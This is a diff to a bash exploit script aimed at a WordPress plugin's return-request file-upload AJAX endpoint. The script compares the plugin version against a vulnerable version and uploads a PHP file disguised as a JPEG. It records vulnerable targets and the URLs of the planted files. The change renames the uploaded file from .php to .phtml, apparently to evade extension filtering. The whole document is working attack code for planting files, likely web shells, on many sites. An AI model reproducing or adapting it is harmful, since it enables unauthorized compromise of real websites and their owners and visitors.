@@ -45,10 +45,10 @@ exploit() {
     prefix=$(head /dev/urandom | tr -dc '0-9' | head -c 6)
     if [ -n "$version" ]; then
         if [[ $version == $vuln || $version < $vuln ]]; then
-            if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=wps_rma_return_upload_files&security_check=$nonce" -F "wps_rma_return_request_order=$prefix" -F 'wps_rma_return_request_files[]=@tifa.php;type=image/jpeg') =~ 'success' ]]; then
-                printf "${green}[ Vuln! Uploaded | Filename: $prefix-tifa.php ]${classic} => [ $target ]\n";
+            if [[ $(curl -s --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=wps_rma_return_upload_files&security_check=$nonce" -F "wps_rma_return_request_order=$prefix" -F 'wps_rma_return_request_files[]=@tifa.phtml;type=image/jpeg') =~ 'success' ]]; then
+                printf "${green}[ Vuln! Uploaded | Filename: $prefix-tifa.phtml ]${classic} => [ $target ]\n";
                 echo "$target" >> vuln.txt
-                echo "$target/wp-content/attachment/${prefix}-tifa.php" >> uploaded.txt
+                echo "$target/wp-content/attachment/${prefix}-tifa.phtml" >> uploaded.txt
             else
                 printf "${red}[ Not Uploaded | WAF Detected! ]${classic} => $target\n";
                 echo "$target" >> notvuln.txt
